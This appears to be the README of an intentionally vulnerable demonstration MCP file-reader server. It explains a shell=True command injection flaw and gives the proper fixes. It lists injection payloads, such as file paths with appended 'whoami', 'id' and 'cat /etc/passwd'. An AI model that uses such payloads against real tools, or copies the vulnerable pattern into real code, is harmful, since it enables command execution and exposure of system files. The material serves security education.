# Command Injection Vulnerability in MCP File Reader

This repository demonstrates a critical command injection vulnerability in a Python MCP (Model Context Protocol) server implementation. The vulnerability allows attackers to execute arbitrary shell commands on the host system by manipulating the file path parameter.

## The Vulnerability

The vulnerability exists in the `read_file` function which is intended to read files from a "safe" directory but contains a dangerous implementation flaw:

```python
command = f"cat {file_name}"
result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
```

This code is vulnerable because:

1. It uses `shell=True` which invokes a shell to execute the command
2. It directly interpolates user input (`file_name`) into the command string without proper sanitization
3. It performs only superficial validation on the input path

A simple semantic difference between using quotes around the filename (`'file_name'`) and not using quotes (`file_name`) exposes the entire system to command execution.

## Installation

### Prerequisites

- Python 3.12 or higher
- MCP library version 1.6.0

### Setup

1. Clone this repository:
   ```bash
   git clone https://github.com/Eliran79/Vulnerable-file-reader-server.git
   cd Vulnerable-file-reader-server
   ```

2. Install the MCP server:
   ```bash
   mcp install main.py
   ```

3. Configure Claude Desktop to use your MCP server by editing `~/.config/claude-desktop/claude_desktop_config.json`:
   ```json
   {
     "mcpServers": {
       "file-reader": {
         "command": "/ABSOLUTE/PATH/TO/uv",
         "args": [
           "--directory",
           "/data/git/file_reader_server",
           "/usr/bin/uv",
           "run,--with,mcp,mcp,run,main.py"
         ]
       }
     }
   }
   ```
   
   Be sure to replace `/ABSOLUTE/PATH/TO/uv` with the actual path to your uv executable and adjust the directory path if needed.

4. Start the MCP server in development mode:
   ```bash
   mcp dev main.py
   ```

## Demonstration

1. In a separate terminal, install and run the MCP inspector:
   ```bash
   pip install mcp-inspector
   mcp-inspector
   ```

2. Connect to the server in the MCP Inspector GUI:
   - Set Transport Type to "STDIO"
   - Set Command to: `run --with mcp run main.py`
   - Click "Restart"

3. Exploit the vulnerability:
   - Go to the "Tools" tab
   - Find the "read_file" tool
   - In the "file_name" field, enter:
     ```
     /tmp/safe/test.txt; whoami
     ```
   - Click "Run Tool"

4. You should see the contents of test.txt followed by your username, demonstrating successful command execution.

## Additional Exploitation Examples

Here are more command injection payloads to try:

```
/tmp/safe/test.txt; id
/tmp/safe/test.txt; ls -la /etc
/tmp/safe/test.txt; cat /etc/passwd
/tmp/safe/test.txt; echo $(hostname)
/tmp/safe/test.txt; find / -name "*.conf" 2>/dev/null | head -5
```

## Proper Fix

To fix this vulnerability, never use `shell=True` with user-provided input. Instead:

```python
# SECURE: Use a list of arguments instead of shell=True
result = subprocess.check_output(['cat', file_name], shell=False)

# OR, if shell=True is necessary, properly quote the argument:
import shlex
result = subprocess.check_output(f"cat {shlex.quote(file_name)}", shell=True)

# AND perform proper path validation:
import os
safe_dir_resolved = os.path.abspath(SAFE_DIRECTORY)
requested_path_resolved = os.path.abspath(file_name)
if not requested_path_resolved.startswith(safe_dir_resolved):
    return f"Error: Access denied. Path traversal attempt detected."
```

## Warning

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**: This implementation contains deliberate security vulnerabilities. Never use this code in a production environment or on any system that contains sensitive information.